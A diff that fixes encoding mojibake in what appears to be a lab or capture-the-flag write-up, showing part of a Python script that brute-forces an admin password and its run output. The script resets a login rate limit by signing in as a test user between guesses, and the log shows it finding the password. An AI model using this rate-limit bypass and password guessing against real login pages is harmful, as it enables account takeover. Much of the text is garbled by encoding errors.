@@ -187,12 +187,12 @@ def main():
  session = requests.Session()
  session.headers.update(HEADERS)
 
- # Iterate through admin00admin â€¦ admin99admin
+ # Iterate through admin00admin ¦ admin99admin
  for x, y in product(range(10), repeat=2):
  trypass = f"admin{x}{y}admin"
- print(f"[+] Trying {trypass}â€¦", end=" ")
+ print(f"[+] Trying {trypass}¦", end=" ")
 
- # 1) Reset the rateâ€limit by logging in as your test user
+ # 1) Reset the ratelimit by logging in as your test user
  session.post(URL, data=DUMMY_CREDS, allow_redirects=True)
 
  # 2) Immediately try the admin login
@@ -219,51 +219,51 @@ The script allows us to bypass the restriction by doing a `POST` request to our 
 
 ```python
 python3 exploit.py
-[+] Trying admin00adminâ€¦ âœ—
-[+] Trying admin01adminâ€¦ âœ—
-[+] Trying admin02adminâ€¦ âœ—
-[+] Trying admin03adminâ€¦ âœ—
-[+] Trying admin04adminâ€¦ âœ—
-[+] Trying admin05adminâ€¦ âœ—
-[+] Trying admin06adminâ€¦ âœ—
-[+] Trying admin07adminâ€¦ âœ—
-[+] Trying admin08adminâ€¦ âœ—
-[+] Trying admin09adminâ€¦ âœ—
-[+] Trying admin10adminâ€¦ âœ—
-[+] Trying admin11adminâ€¦ âœ—
-[+] Trying admin12adminâ€¦ âœ—
-[+] Trying admin13adminâ€¦ âœ—
-[+] Trying admin14adminâ€¦ âœ—
-[+] Trying admin15adminâ€¦ âœ—
-[+] Trying admin16adminâ€¦ âœ—
-[+] Trying admin17adminâ€¦ âœ—
-[+] Trying admin18adminâ€¦ âœ—
-[+] Trying admin19adminâ€¦ âœ—
-[+] Trying admin20adminâ€¦ âœ—
-[+] Trying admin21adminâ€¦ âœ—
-[+] Trying admin22adminâ€¦ âœ—
-[+] Trying admin23adminâ€¦ âœ—
-[+] Trying admin24adminâ€¦ âœ—
-[+] Trying admin25adminâ€¦ âœ—
-[+] Trying admin26adminâ€¦ âœ—
-[+] Trying admin27adminâ€¦ âœ—
-[+] Trying admin28adminâ€¦ âœ—
-[+] Trying admin29adminâ€¦ âœ—
-[+] Trying admin30adminâ€¦ âœ—
-[+] Trying admin31adminâ€¦ âœ—
-[+] Trying admin32adminâ€¦ âœ—
-[+] Trying admin33adminâ€¦ âœ—
-[+] Trying admin34adminâ€¦ âœ—
-[+] Trying admin35adminâ€¦ âœ—
-[+] Trying admin36adminâ€¦ âœ—
-[+] Trying admin37adminâ€¦ âœ—
-[+] Trying admin38adminâ€¦ âœ—
-[+] Trying admin39adminâ€¦ âœ—
-[+] Trying admin40adminâ€¦ âœ—
-[+] Trying admin41adminâ€¦ âœ—
-[+] Trying admin42adminâ€¦ âœ—
-[+] Trying admin43adminâ€¦ âœ—
-[+] Trying admin44adminâ€¦ âœ… SUCCESS!
+[+] Trying admin00admin¦ âœ—
+[+] Trying admin01admin¦ âœ—
+[+] Trying admin02admin¦ âœ—
+[+] Trying admin03admin¦ âœ—
+[+] Trying admin04admin¦ âœ—
+[+] Trying admin05admin¦ âœ—
+[+] Trying admin06admin¦ âœ—
+[+] Trying admin07admin¦ âœ—
+[+] Trying admin08admin¦ âœ—
+[+] Trying admin09admin¦ âœ—
+[+] Trying admin10admin¦ âœ—
+[+] Trying admin11admin¦ âœ—
+[+] Trying admin12admin¦ âœ—
+[+] Trying admin13admin¦ âœ—
+[+] Trying admin14admin¦ âœ—
+[+] Trying admin15admin¦ âœ—
+[+] Trying admin16admin¦ âœ—
+[+] Trying admin17admin¦ âœ—
+[+] Trying admin18admin¦ âœ—
+[+] Trying admin19admin¦ âœ—
+[+] Trying admin20admin¦ âœ—
+[+] Trying admin21admin¦ âœ—
+[+] Trying admin22admin¦ âœ—
+[+] Trying admin23admin¦ âœ—
+[+] Trying admin24admin¦ âœ—
+[+] Trying admin25admin¦ âœ—
+[+] Trying admin26admin¦ âœ—
+[+] Trying admin27admin¦ âœ—
+[+] Trying admin28admin¦ âœ—
+[+] Trying admin29admin¦ âœ—
+[+] Trying admin30admin¦ âœ—
+[+] Trying admin31admin¦ âœ—
+[+] Trying admin32admin¦ âœ—
+[+] Trying admin33admin¦ âœ—
+[+] Trying admin34admin¦ âœ—
+[+] Trying admin35admin¦ âœ—
+[+] Trying admin36admin¦ âœ—
+[+] Trying admin37admin¦ âœ—
+[+] Trying admin38admin¦ âœ—
+[+] Trying admin39admin¦ âœ—
+[+] Trying admin40admin¦ âœ—
+[+] Trying admin41admin¦ âœ—
+[+] Trying admin42admin¦ âœ—
+[+] Trying admin43admin¦ âœ—
+[+] Trying admin44admin¦ âœ… SUCCESS!
  â†’ admin password is: admin44admin
 ```
 
